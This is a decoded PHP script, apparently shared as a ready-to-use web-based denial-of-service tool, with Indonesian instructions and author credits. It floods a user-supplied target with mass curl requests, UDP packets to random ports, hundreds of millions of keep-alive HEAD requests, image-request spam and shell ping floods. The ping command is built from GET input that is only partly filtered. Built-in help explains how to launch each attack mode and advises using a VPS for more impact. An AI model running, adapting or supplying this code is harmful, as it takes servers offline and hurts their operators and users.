/* Decoded by unphp.net */

<?php ?><?php
$ksatria = $_GET["url"];
$target_url = "$ksatria";
$max_requests = 900000000;
$max_requests_per_connection = 500;
$delay_between_connections = 0;
$delay_between_requests = 0;
$skip_check = 1;$self   = $_SERVER['PHP_SELF'];$urin = $_SERVER['HTTP_HOST'];
$lukman=rand(0,9);$hakim=base64_encode($lukman);
$useragent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7";
$max_count = 100000; 
$register_globals = (bool) ini_get('register_gobals'); 
$system = ini_get('system'); 
$unix = (bool) $unix; 
$win  = (bool)  $windows; 
if($_SERVER['SERVER_PROTOCOL']){
$output_to_browser = 1;
} else {
$output_to_browser = 0;
}
if($output_to_browser == 1){
set_time_limit(300);
$lb = "<br>
";
$tanggal = date_default_timezone_set("Asia/Jakarta");
function Tampilkan_Hari($waktu)
{
if(!$waktu) 
$waktu = $tanggal;
$waktu = date("d-m-Y");
$jhari = 0;
$array = explode("-", $waktu);
$tgl = $array[0];
$bln = $array[1];
$thn = $array[2];
$bulan = "Januari <sup><small>1</small></sup>";
switch($bln)
{
case 2: { $bulan = "Pebruari <sup><small>2</small></sup>"; $jhari = 31; break; }
case 3: { $bulan = "Maret <sup><small>3</small></sup>"; $jhari = 59; break; }
case 4: { $bulan = "April <sup><small>4</small></sup>"; $jhari = 90; break; }
case 5: { $bulan = "Mei <sup><small>5</small></sup>"; $jhari = 120; break; }
case 6: { $bulan = "Juni <sup><small>6</small></sup>"; $jhari = 151; break; }
case 7: { $bulan = "Juli <sup><small>7</small></sup>"; $jhari = 181; break; }
case 8: { $bulan = "Agustus <sup><small>8</small></sup>"; $jhari = 212; break; }
case 9: { $bulan = "September <sup><small>9</small></sup>"; $jhari = 243; break; }
case 10: { $bulan = "Oktober <sup><small>10</small></sup>"; $jhari = 273; break; }
case 11: { $bulan = "Nopember <sup><small>11</small></sup>"; $jhari = 304; break; }
case 12: { $bulan = "Desember <sup><small>12</small></sup>"; $jhari = 334; }
}
$jml_kabisat = 1+floor($thn/4);
if($thn>100) $jml_kabisat -= floor($thn/100);
if($thn>399) $jml_kabisat += floor($thn/400);
if(($thn-(floor($thn/4)*4))<1 && $bln<3) $jml_kabisat;
$jmlhari = $thn*365+$jhari+$tgl+$jml_kabisat;
$urutan_hari = $jmlhari-(floor($jmlhari/7)*7);
switch($urutan_hari)
{
case 0: $hari = "Jum'at <sup><small>6</small></sup>"; break;
case 1: $hari = "Sabtu <sup><small>9</small></sup>"; break;
case 2: $hari = "Minggu <sup><small>5</small></sup>"; break;
case 3: $hari = "Senin <sup><small>4</small></sup>"; break;
case 4: $hari = "Selasa <sup><small>3</small></sup>"; break;
case 5: $hari = "Rabu <sup><small>7</small></sup>"; break;
case 6: $hari = "Kamis <sup><small>8</small></sup>";
}
$pasaran_jawa = $jmlhari-(floor($jmlhari/5)*5);
switch($pasaran_jawa)
{
case 0: $hari_jawa = "Kliwon <sup><small>8</small></sup>"; break;
case 1: $hari_jawa = "Legi <sup><small>5</small></sup>"; break;
case 2: $hari_jawa = "Pahing <sup><small>9</small></sup>"; break;
case 3: $hari_jawa = "Pon <sup><small>7</small></sup>"; break;
case 4: $hari_jawa = "Wage <sup><small>4</small></sup>";
}
$hasil = $hari." ".$hari_jawa.", ".$tgl." ".$bulan." ".$thn;
if($tgl>28)
{
if((($thn%4)>0 && $bln==2) || $tgl>30)
{
if($bln!=1 && $bln!=3 && $bln!=5 && $bln!=7 && $bln!=8 && $bln!=10 && $bln!=12) $hasil = false;
}}
return $hasil;
}
$gmt="+7";
$pukul = time() + ($gmt * 60 * 60);
$jam=gmdate("H:i:s",$pukul);
 if(isset($_GET['ket'])){
die("<font color='white'><b>
<br/> pertama-tama silahkan edit $ unix & $ windows nya dulu bila memakai server windows maka ganti volumenya dari 0 menjadi 1, begitu pula sebaliknya dan jangan sampai kedua-duanya 0 atau kedua-duanya 1 tapi harus salah satunya saja	 
<br/> - cara menggunakan langsung dari file misal http://".$urin."/".basename('index.php')."?url=http://google.com ini otomatis menyerang tanpa ping dan udp flood
<br/> - dengan memakai semua fiturnya tambahkan sesudah url target &c=5&s=p jadinya http://".$urin."/".basename('index.php')."?url=http://google.com&c=5&s=p
<br/> - c=5 c adalah jumlah counter ping bisa anda rubah sesuai kebutuhan juga sebagai pemanggil perintah udp flood dan s=p adalh kode pembuka ping spam dan  perintah c dan s tidak harus dipakai pada hosting yang rentan suspended
<br/> - format target bisa langsung ip atau host dengan http:// atau tanpa http:// contoh http://".$urin."/".basename('index.php')."?url=www.google.com&c=5&s=p
<br/> - support https:// atau ssl contoh http://".$urin."/".basename('index.php')."?url=https://google.com&c=5&s=p 
<br/> - gunakan hosting yang kuat karena script ini sangat berat sesuai dengan beratnya efek pada target, disarankan memakai vps
<br/> - bisa dibuatkan form html yang ditujukan ke file ini, contoh :<br/><textarea style='width:100%'> <form action=\"http://".$urin."/".basename('index.php')."\" method=\"get\">Target: <input type=\"text\" name=\"url\" value=\"\"><input type=\"text\" name=\"c\" size=\"2\" value=\"5\"><input type=\"hidden\" name=\"s\" value=\"p\"><input type=\"submit\" value=\"Serang\"></form></textarea>
<br/><br/>Gampangnya sebagai berikut :	 
<br/> - http://".$urin."/".basename('index.php')."?url=https://google.com         = &gt;&gt; keepdead + curl dos + fsockopen dos + spam img
<br/> - http://".$urin."/".basename('index.php')."?url=https://google.com&c=5     = &gt;&gt; keepdead + curl dos + fsockopen dos + spam img + udp flood + boot server
<br/> - http://".$urin."/".basename('index.php')."?url=https://google.com&c=5&s=p = &gt;&gt; keepdead + curl dos + fsockopen dos + spam img + udp flood + boot server + ping unix/windows
<br/> - http://".$urin."/".basename('index.php')."?url=https://google.com&c=5&s=p = &gt;&gt; keepdead + curl dos + fsockopen dos + spam img + udp flood + boot server + ping unix/windows pada target ssl (https)
<br/> - http://".$urin."/".basename('index.php')."?url=http://google.com&c=5&s=p  = &gt;&gt; keepdead + curl dos + fsockopen dos + spam img + udp flood + boot server + ping unix/windows pada target http
<br/> - http://".$urin."/".basename('index.php')."?url=www.google.com&c=5&s=p     = &gt;&gt; keepdead + curl dos + fsockopen dos + spam img + udp flood + boot server + ping unix/windows tanpa http atau https
<br/> - http://".$urin."/".basename('index.php')."?url=10.19.19.19&c=5&s=p        = &gt;&gt; keepdead + curl dos + fsockopen dos + spam img + udp flood + boot server + ping unix/windows langsung pada ip target
<br/><br/><br/>
<br/> saya rasa cukup sekian dari saya, silahkan dicoba sendiri, kurang lebihnya saya mohon maaf, dan salam fire!!!!!!!!!!!!!	 
</b></font>");
 }
echo"<html><HEAD><title>".$ksatria."</title>";
echo '<style>
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;}
table.info{ color:#fff;background-color:#222;,border:1px solid #df5; }
span,a{ color: #df5 !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid #df5;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
input,textarea,select,text{ margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace; }
form{ margin:0px; }
.th{text-align:left;background-color:#5e5e5e;}
.tr:hover{background-color:#5e5e5e}
pre{font-family:Courier,Monospace;}
</style>';
echo"</HEAD><body><center>";
echo"<table bgcolor=\"#000000\" border=\"1\"><tr><td>";echo Tampilkan_Hari($waktu);echo"&nbsp;&nbsp;$jam WIB $hari";echo"</td></tr></table>";
echo $pesan;
echo"<table bgcolor=\"#000000\" border=\"1\"><tr><td><form action=\"\" method=\"get\"><center>Target: <input type=\"text\" name=\"url\" value=\"$ksatria\"><input type=\"text\" name=\"c\" size=\"2\" value=\"5\">"; 
echo '<input type="hidden" name="s" value="p"><input type="submit" value="Serang"></input></form></td></tr></table>';
echo"<table bgcolor=\"#000000\" border=\"1\"><tr><td>";
function MakeArrays($count, $url)
{
  echo "[+]</td>
";
  $victim = array();
   for($c = 0; $c <= $count; $c++)
   {
     $victim[$c] = $url; 
   }
   echo "<td>[+]</td>
";
   return $victim;
}
if(!isset($_REQUEST['url']) || empty($_REQUEST['url']))
die("<b><big>Sepatah kata dari saya, \"siapa yang menabur angin akan menuai badai\"</big>, hehe...</b><br/><iframe src='".basename('index.php')."?ket' width='700px;' height='300px;' frameborder='0'></iframe><br/><p align=right>&copy; Hormat Saya <a target=\"new\" href=\"https://www.facebook.com/lukmanul.khakim.ksatria.us\">Ksatria</a> BKHT</small> &trade;
");
$victim = MakeArrays(trim($_REQUEST['c']), trim($_REQUEST['url']));
echo "<td>[+]</td>";
$mh = curl_multi_init();
foreach ($victim as $i => $url)
{
       $c[$i] = curl_init($url);
       curl_setopt($c[$i], CURLOPT_RETURNTRANSFER, 1);
       curl_multi_add_handle($mh, $c[$i]);
}
echo "<td>[+]</td>";
echo "<td>[+]</td>";
do 
{
  $n = curl_multi_exec($mh, $active); 
} while ($active);
echo "<td>[+]<td>";
echo "<td>[+]</td>";
foreach ($victim as $i => $url)
{
       $res[$i]=curl_multi_getcontent($c[$i]);
       curl_close($c[$i]);
}
echo "<td>[+]
";
echo'</td></tr></table>';
if(isset($_GET['url'])&&isset($_GET['c'])){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0); 
    $exec_time = $_GET['c']; 
    $c = time();
    $max_time = $c+$exec_time; 
$url = $_GET['url'];
$url= preg_replace ("/[^A-Za-z0-9.-]/","",$url); 
$url= str_replace ("https%3A%2F%2F","",$url);
$url= str_replace ("http%3A%2F%2F","",$url);
$url= str_replace ("&c=5&s=p","",$url); 
$url= str_replace ("https","",$url);
$url= str_replace ("http","",$url);
for($i=0;$i<65553;$i++){
            $out .= 'X';
}
while(1){
$packets++;
if(time() > $max_time){
break;
}
$rand = rand(1,65553);
$fp = fsockopen('udp://'.$url, $rand, $errno, $errstr, 5);
if($fp){
fwrite($fp, $out);
fclose($fp);
}} 
echo "<table bgcolor=\"#000000\" border=\"1\"><tr><td>UDP Flood <sup>(".$fp.")</sup> Ke : <a href=\"http://".$url."\" target=\"new\">".$url."</a> Sukses terkirim<br/>
Jumlah : $packets <sup>(" . round(($packets*65)/1024, 2) . " MB)</sup> Paket Data, Kecepatan : ". round($packets/$exec_time, 2) . " Perdetik</td></tr>
";
} 
function Visit($url){
       $agent = "NULL";$ch=curl_init();
       curl_setopt ($ch, CURLOPT_URL,$url );
       curl_setopt($ch, CURLOPT_USERAGENT, $agent);
       curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt ($ch,CURLOPT_VERBOSE,false);
       curl_setopt($ch, CURLOPT_TIMEOUT, 10);
       curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, FALSE);
       curl_setopt($ch,CURLOPT_SSLVERSION,3);
       curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, FALSE);
       $page=curl_exec($ch); echo"<table bgcolor=\"#000000\" border=\"1\"><tr><td>";
       echo curl_error($ch);
       $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
       curl_close($ch);
       if($httpcode>=200 && $httpcode<300) return true;
       else return false;
}
if (Visit("$url"))
echo "Target <a href=\"http://".$url."\" target=\"new\">".$url."</a> <big><b>Masih UP</b></big>";
else
echo "Target <a href=\"http://".$url."\" target=\"new\">".$url."</a> <big><b>Sudah DOWN</b></big>";
echo"</td></tr></table>";   
   If ($register_globals) 
{ 
   $ip = getenv(REMOTE_ADDR); 
   $self = $PHP_SELF; 
}  
else  
{ 
   $submit = $_GET['s']; 
   $count  = $_GET['c']; 
   $host   = $ksatria; 
   $ip     = $_SERVER['REMOTE_ADDR']; 
   $self   = $_SERVER['PHP_SELF']; 
}; 
If ($submit == "p")  
{ 
If ($count > $max_count)  
   { 
echo 'Maximum for count is: '.$max_count; 
echo '<a href="'.$self.'">Back</a>'; 
   } 
   else  
   { 
$host= $url;
$count= preg_replace ("/[^0-9.]/","",$count); 
echo '<table bgcolor="#000000" text="#ffffff" border="2"><tr><td>'; 
echo '<pre>';            
if ($unix)  
{ 
system ("ping -c$count -w$count $host"); 
system("killall ping");
} 
else 
{ 
system("ping -n $count $host"); 
} 
echo '</pre><p align=right>&copy; <small>Mod By <a target="new" href="https://www.facebook.com/lukmanul.khakim.ksatria.us">Ksatria</a> BKHT</small> &trade;</p></td></tr></table>'; 
} } } else {
set_time_limit(0);
$lb = "
";
echo "Error".$lb.$lb;
}
function quick_rand(){
$letters = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
$rand_string = '';
for($i=0;$i<rand(4,12);$i++){
$rand_string.=$letters[array_rand($letters)];
}
return($rand_string);
}
$target_url_parsed = parse_url($target_url);
$target_url = array();
$target_url['host'] = $target_url_parsed['host'];
@$target_url['path'] = $target_url_parsed['path'];
@$target_url['query'] = $target_url_parsed['query'];
@$target_url['port'] = $target_url_parsed['port'];
if(!$target_url['path']){
	$target_url['path'] = '/';
}
if(!$target_url['host']){
	$target_url['host'] = $ksatria;
}
if(!$target_url['port']){
	$target_url['port'] = 80;
}
if($target_url['query']){
	$request_url = $target_url['path']."?".$target_url['query'];
} else {
	$request_url = $target_url['path'];
}
if($skip_check != 1){
	$reply = '';
	$socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
	if(!$socket){
		die("Failed to open a connection to ".$target_url['host']." on port ".$target_url['port'].$lb);
	}
	$request = "HEAD / HTTP/1.1
HOST: NULL
User-Agent: NULL
Connection: Keep-Alive
Referrer: NULL
Message: DDOS ATTACK BY IS-TEAM & 3XPLOIT.ID
";
	fwrite($socket, $request);
	$incoming_data = '';
	while (!feof($socket)){
		$buffer=fgets($socket, 128);
		$reply.=$buffer;
		if($buffer == "
"){
			@fclose($socket); break;
		}
	}
	if(strpos($reply, "Connection: close")){
		echo $target_url['host']." does not support Keep-Alive! max_requests_per_connection will be set to 1, making this a much slower attack.

";
		$max_requests_per_connection = 1;
} }
if($max_requests_per_connection > 100){ $max_requests_per_connection = 100; }
if($max_requests_per_connection < 1){ $max_requests_per_connection = 1; }
$max_connections = ceil($max_requests / $max_requests_per_connection);
for($c=0;$c<$max_connections;$c++){
$al=quick_rand();	
echo "<table bgcolor=\"#000000\" border=\"1\"><tr><td>Serangan Ke<font color=lime>(".($c+1).")</font>. Target:<a href=\"http://$ksatria\" target=new>".$target_url['host']."</a> Status Serangan:";
@$attack_socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
if(!$attack_socket){
echo "<span><font color=red><h1>Gagal Mengirimkan Serangan Ketarget</h1></font></span>- Harap Periksa koneksi internet anda atau target host/ip</td></tr><tr><td><center>(".$errstr.")</td></tr></table>".$lb;
} else {
echo "<span><blink>Sukses</blink></span></td></tr></table>";
for($r=0;$r<$max_requests_per_connection;$r++){
$request = "HEAD ".str_replace("%rand%", quick_rand(), $request_url)." HTTP/1.1
HOST: ".$target_url['host']."
User-Agent: NULL
Connection: Keep-Alive
Referrer: NULL
Message: DDOS ATTACK BY IS TEAM & 3XPLOIT.ID

";
@fwrite($attack_socket, $request);
echo "<img src=\"$ksatria/".$lukman."".$al.".khakim.gif\" alt=\"*\"/>";
usleep($delay_between_requests * 1000000);
}
echo "</td></tr></table>";
}
@fclose($attack_socket);	
usleep($delay_between_connections * 1000000);
}
echo"</body></html>";

?>